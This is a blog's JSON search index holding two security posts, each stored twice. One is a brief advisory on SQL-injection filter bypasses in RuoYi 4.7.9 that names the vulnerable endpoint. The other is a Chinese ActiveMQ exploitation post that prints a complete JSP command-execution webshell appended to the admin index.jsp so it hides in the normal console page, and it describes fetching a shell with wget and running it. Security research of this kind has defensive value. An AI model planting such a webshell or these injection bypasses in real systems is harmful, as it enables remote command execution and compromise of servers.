{"meta":{"title":"MyStie","subtitle":"","description":"","author":"Hello","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"Ruoyi <= 4.7.9 SQL injection","slug":"RuoYi最新版SQL注入","date":"2024-08-22T06:33:56.261Z","updated":"2024-08-30T05:02:08.778Z","comments":true,"path":"2024/08/22/RuoYi最新版SQL注入/","link":"","permalink":"http://example.com/2024/08/22/RuoYi%E6%9C%80%E6%96%B0%E7%89%88SQL%E6%B3%A8%E5%85%A5/","excerpt":"Ruoyi &lt;&#x3D; 4.7.9 SQL injectionrepositories：https://github.com/yangzongzhuan/RuoYi website：https://ruoyi.vip/ version：Ruoyi&lt;&#x3D;4.7.9 code position：package com.ruoyi.common.utils.sql.SqlUtil.java Issue 1: Incomplete Parameter Filtering: The project only filters common error injection keywords and commonly used SQL injection keywords. However, it does not filter keywords like floor, which allows for the construction of a proof of concept (PoC) using keywords like floor to achieve error-based injection. Issue 2: Bypassing Keyword Filtering: When filtering common keywords like select, insert, etc., the system matches these keywords only when they are followed by a space. This allows an attacker to bypass the filtering by using &#x2F;**&#x2F; to separate the keywords. request: post &#x2F;tool&#x2F;gen&#x2F;createTable , parameter: sql my blog：https://h-sec-research.blogspot.com/2024/08/ruoyi-479-sql-injection.html","text":"Ruoyi &lt;&#x3D; 4.7.9 SQL injectionrepositories：https://github.com/yangzongzhuan/RuoYi website：https://ruoyi.vip/ version：Ruoyi&lt;&#x3D;4.7.9 code position：package com.ruoyi.common.utils.sql.SqlUtil.java Issue 1: Incomplete Parameter Filtering: The project only filters common error injection keywords and commonly used SQL injection keywords. However, it does not filter keywords like floor, which allows for the construction of a proof of concept (PoC) using keywords like floor to achieve error-based injection. Issue 2: Bypassing Keyword Filtering: When filtering common keywords like select, insert, etc., the system matches these keywords only when they are followed by a space. This allows an attacker to bypass the filtering by using &#x2F;**&#x2F; to separate the keywords. request: post &#x2F;tool&#x2F;gen&#x2F;createTable , parameter: sql my blog：https://h-sec-research.blogspot.com/2024/08/ruoyi-479-sql-injection.html","categories":[],"tags":[]},{"title":"ActiveMQ漏洞研究","slug":"activeMQAttack","date":"2023-11-02T04:57:41.309Z","updated":"2023-11-02T05:57:10.287Z","comments":true,"path":"2023/11/02/activeMQAttack/","link":"","permalink":"http://example.com/2023/11/02/activeMQAttack/","excerpt":"Quick Start漏洞原理：深度利用写shell 默认情况下，ActiveMQ 仅在 admin 和 api 目录具有写入权限，且访问 admin 或者 api 均需要登录。此时若无法爆破出密码，直接利用ActiveMQ写shell就很难实现。但是存在一种情况是，ActiveMQ具有足够权限的时候，可以将 admin 下的 index .jsp 进行修改，在其后面添加 webshell（如下所示：上半部分是正常的index.jsp，后面则是被添加的webshell），此时正常访问ActiveMQ的admin目录即可获取webshell 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108&lt;%-- Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements. See the NOTICE file distributed with this work for additional information regarding copyright ownership. The ASF licenses this file to You under the Apache License, Version 2.0 (the &quot;License&quot;); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an &quot;AS IS&quot; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.--%&gt;&lt;html&gt;&lt;head&gt;&lt;c:set var=&quot;pageTitle&quot; value=&quot;ActiveMQ Console&quot;/&gt;&lt;%@include file=&quot;decorators/head.jsp&quot; %&gt;&lt;/head&gt;&lt;body&gt;&lt;%@include file=&quot;decorators/header.jsp&quot; %&gt;&lt;h2&gt;Welcome!&lt;/h2&gt;&lt;p&gt;Welcome to the Apache ActiveMQ Console of &lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerName&#125;&quot; /&gt;&lt;/b&gt; (&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.brokerId&#125;&quot; /&gt;)&lt;/p&gt;&lt;p&gt;You can find more information about Apache ActiveMQ on the &lt;a href=&quot;&lt;c:url value=&quot;http://activemq.apache.org/&quot; /&gt;&quot;&gt;Apache ActiveMQ Site&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;Broker&lt;/h2&gt;&lt;table&gt; &lt;tr&gt; &lt;td&gt;Name&lt;/td&gt; &lt;td&gt;&lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.brokerName&#125;&quot; /&gt;&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Version&lt;/td&gt; &lt;td&gt;&lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.brokerVersion&#125;&quot; /&gt;&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;ID&lt;/td&gt; &lt;td&gt;&lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.brokerId&#125;&quot; /&gt;&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Uptime&lt;/td&gt; &lt;td&gt;&lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.uptime&#125;&quot; /&gt;&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Store percent used&lt;/td&gt; &lt;td&gt;&lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.storePercentUsage&#125;&quot; /&gt;&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Memory percent used&lt;/td&gt; &lt;td&gt;&lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.memoryPercentUsage&#125;&quot; /&gt;&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Temp percent used&lt;/td&gt; &lt;td&gt;&lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.tempPercentUsage&#125;&quot; /&gt;&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;&lt;%@include file=&quot;decorators/footer.jsp&quot; %&gt;&lt;/body&gt;&lt;/html&gt;&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;&lt;%//// JSP_KIT//// cmd.jsp = Command Execution (win32)//// by: Unknown// modified: 27/06/2003//%&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD=&quot;POST&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;%if (request.getParameter(&quot;cmd&quot;) != null) &#123; out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\\n&lt;BR&gt;&quot;); Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) &#123; out.println(disr); disr = dis.readLine(); &#125; &#125;%&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt; 直接上线 由于在互联网测，要想利用漏洞则必须是服务器可出网的情况下，那么也可以考虑直接进行上线，先利用 wget 下载 shell，然后逐步赋权运行。","text":"Quick Start漏洞原理：深度利用写shell 默认情况下，ActiveMQ 仅在 admin 和 api 目录具有写入权限，且访问 admin 或者 api 均需要登录。此时若无法爆破出密码，直接利用ActiveMQ写shell就很难实现。但是存在一种情况是，ActiveMQ具有足够权限的时候，可以将 admin 下的 index .jsp 进行修改，在其后面添加 webshell（如下所示：上半部分是正常的index.jsp，后面则是被添加的webshell），此时正常访问ActiveMQ的admin目录即可获取webshell 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108&lt;%-- Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements. See the NOTICE file distributed with this work for additional information regarding copyright ownership. The ASF licenses this file to You under the Apache License, Version 2.0 (the &quot;License&quot;); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an &quot;AS IS&quot; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.--%&gt;&lt;html&gt;&lt;head&gt;&lt;c:set var=&quot;pageTitle&quot; value=&quot;ActiveMQ Console&quot;/&gt;&lt;%@include file=&quot;decorators/head.jsp&quot; %&gt;&lt;/head&gt;&lt;body&gt;&lt;%@include file=&quot;decorators/header.jsp&quot; %&gt;&lt;h2&gt;Welcome!&lt;/h2&gt;&lt;p&gt;Welcome to the Apache ActiveMQ Console of &lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerName&#125;&quot; /&gt;&lt;/b&gt; (&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.brokerId&#125;&quot; /&gt;)&lt;/p&gt;&lt;p&gt;You can find more information about Apache ActiveMQ on the &lt;a href=&quot;&lt;c:url value=&quot;http://activemq.apache.org/&quot; /&gt;&quot;&gt;Apache ActiveMQ Site&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;Broker&lt;/h2&gt;&lt;table&gt; &lt;tr&gt; &lt;td&gt;Name&lt;/td&gt; &lt;td&gt;&lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.brokerName&#125;&quot; /&gt;&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Version&lt;/td&gt; &lt;td&gt;&lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.brokerVersion&#125;&quot; /&gt;&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;ID&lt;/td&gt; &lt;td&gt;&lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.brokerId&#125;&quot; /&gt;&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Uptime&lt;/td&gt; &lt;td&gt;&lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.uptime&#125;&quot; /&gt;&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Store percent used&lt;/td&gt; &lt;td&gt;&lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.storePercentUsage&#125;&quot; /&gt;&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Memory percent used&lt;/td&gt; &lt;td&gt;&lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.memoryPercentUsage&#125;&quot; /&gt;&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Temp percent used&lt;/td&gt; &lt;td&gt;&lt;b&gt;&lt;c:out value=&quot;$&#123;requestContext.brokerQuery.brokerAdmin.tempPercentUsage&#125;&quot; /&gt;&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;&lt;%@include file=&quot;decorators/footer.jsp&quot; %&gt;&lt;/body&gt;&lt;/html&gt;&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;&lt;%//// JSP_KIT//// cmd.jsp = Command Execution (win32)//// by: Unknown// modified: 27/06/2003//%&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD=&quot;POST&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;%if (request.getParameter(&quot;cmd&quot;) != null) &#123; out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\\n&lt;BR&gt;&quot;); Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) &#123; out.println(disr); disr = dis.readLine(); &#125; &#125;%&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt; 直接上线 由于在互联网测，要想利用漏洞则必须是服务器可出网的情况下，那么也可以考虑直接进行上线，先利用 wget 下载 shell，然后逐步赋权运行。","categories":[],"tags":[]}],"categories":[],"tags":[]}